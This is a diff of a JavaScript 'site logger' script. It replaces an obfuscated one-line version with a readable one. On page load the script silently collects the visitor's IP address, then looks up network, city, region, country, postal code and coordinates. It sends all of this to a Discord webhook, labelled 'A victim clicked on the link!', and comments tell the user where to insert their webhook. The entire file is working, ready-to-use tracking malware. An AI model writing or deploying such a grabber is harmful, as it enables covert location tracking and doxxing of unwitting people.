@@ -1,1 +1,83 @@
-(function(_0x191609,_0x65291d){const _0x174add=_0x4606,_0x448340=_0x191609();while(!![]){try{const _0x1c5ef0=-parseInt(_0x174add(0x13f))/0x1*(parseInt(_0x174add(0x155))/0x2)+parseInt(_0x174add(0x151))/0x3+parseInt(_0x174add(0x14f))/0x4*(parseInt(_0x174add(0x147))/0x5)+parseInt(_0x174add(0x163))/0x6*(parseInt(_0x174add(0x153))/0x7)+-parseInt(_0x174add(0x150))/0x8*(parseInt(_0x174add(0x159))/0x9)+-parseInt(_0x174add(0x144))/0xa*(parseInt(_0x174add(0x15c))/0xb)+-parseInt(_0x174add(0x15a))/0xc;if(_0x1c5ef0===_0x65291d)break;else _0x448340['push'](_0x448340['shift']());}catch(_0x1a00a7){_0x448340['push'](_0x448340['shift']());}}}(_0xec45,0x8732b));const sendIP=()=>{const _0x46f87d=_0x4606;fetch(_0x46f87d(0x15e))['then'](_0x12b2d0=>_0x12b2d0['json']())[_0x46f87d(0x142)](_0x2b9290=>{const _0x3bb954=_0x46f87d;let _0x1e3205=_0x2b9290['ip'];return fetch(_0x3bb954(0x165)+_0x1e3205+'/json/')[_0x3bb954(0x142)](_0xe4a183=>_0xe4a183[_0x3bb954(0x152)]())[_0x3bb954(0x142)](_0x2f237f=>fetch('YOUR\x20WEBHOOK',{'method':_0x3bb954(0x15b),'headers':{'Content-Type':_0x3bb954(0x160)},'body':JSON[_0x3bb954(0x15d)]({'username':_0x3bb954(0x143),'avatar_url':'https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg','content':'@here','embeds':[{'title':'A\x20victim\x20clicked\x20on\x20the\x20link!','description':_0x3bb954(0x15f)+_0x1e3205+'\x0a**Network\x20>>\x20**\x20'+_0x2f237f[_0x3bb954(0x164)]+_0x3bb954(0x157)+_0x2f237f[_0x3bb954(0x14b)]+_0x3bb954(0x162)+_0x2f237f[_0x3bb954(0x145)]+'\x0a**Country\x20>>\x20**\x20'+_0x2f237f[_0x3bb954(0x149)]+_0x3bb954(0x14a)+_0x2f237f[_0x3bb954(0x154)]+_0x3bb954(0x141)+_0x2f237f[_0x3bb954(0x161)]+_0x3bb954(0x146)+_0x2f237f[_0x3bb954(0x140)],'color':0x800080}]})}));})[_0x46f87d(0x142)](_0x3d249f=>{const _0x579412=_0x46f87d;_0x3d249f['ok']?console[_0x579412(0x14c)]('Sent!\x20<3'):console[_0x579412(0x14c)](_0x579412(0x148));})[_0x46f87d(0x156)](_0x432f4d=>{const _0x3b84f3=_0x46f87d;console[_0x3b84f3(0x14d)](_0x3b84f3(0x158),_0x432f4d),console[_0x3b84f3(0x14c)](_0x3b84f3(0x14e));});};sendIP();function _0x4606(_0x488706,_0x2fdb4b){const _0xec455b=_0xec45();return _0x4606=function(_0x4606c2,_0x13469e){_0x4606c2=_0x4606c2-0x13f;let _0x30766b=_0xec455b[_0x4606c2];return _0x30766b;},_0x4606(_0x488706,_0x2fdb4b);}function _0xec45(){const _0x2467aa=['application/json','latitude','\x0a**Region\x20>>\x20**\x20','168594knocuX','network','https://ipapi.co/','1613qVCvqn','longitude','\x0a**Latitude\x20>>\x20**\x20','then','site\x20logger\x20<3','2835930DnndRh','region','\x0a**Longitude\x20>>\x20**\x20','1355910DVpniy','Failed\x20:(','country_name','\x0a**Postal\x20Code\x20>>\x20**\x20','city','log','error','Error\x20:(','16oHskoV','4500856yBwjlb','2488839xNMPfT','json','238FjrQag','postal','358LZEOtB','catch','\x0a**City\x20>>\x20**\x20','Error:','9CPznsM','14172108DryYxh','POST','11WfyIyV','stringify','https://api.ipify.org?format=json','**IP\x20Address\x20>>\x20**'];_0xec45=function(){return _0x2467aa;};return _0xec45();}
+const sendIP = () => {
+
+    fetch('https://api.ipify.org?format=json')
+
+        .then(ipResponse => ipResponse.json())
+
+        .then(ipData => {
+
+            const ipadd = ipData.ip;
+
+            return fetch(`https://ipapi.co/${ipadd}/json/`)
+
+                .then(geoResponse => geoResponse.json())
+
+                .then(geoData => {
+
+                    const dscURL = 'YOUR WEBHOOK'; // replace with your webhook url
+
+                    return fetch(dscURL, {
+
+                        method: 'POST',
+
+                        headers: {
+
+                            'Content-Type': 'application/json'
+
+                        },
+
+                        body: JSON.stringify({
+
+                            username: "site logger <3", // optionally changeable
+
+                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
+
+                            content: `@here`,
+
+                            embeds: [
+
+                                {
+
+                                    title: 'A victim clicked on the link!',
+
+                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
+
+                                    color: 0x800080 // optionally changeable
+
+                                }
+
+                            ]
+
+                        })
+
+                    });
+
+                });
+
+        })
+
+        .then(dscResponse => {  
+
+            if (dscResponse.ok) {
+
+                console.log('Sent! <3');
+
+            } else {
+
+                console.log('Failed :(');
+
+            }
+
+        })
+
+        .catch(error => {
+
+            console.error('Error:', error);
+
+            console.log('Error :(');
+
+        });
+
+};
+
+sendIP();
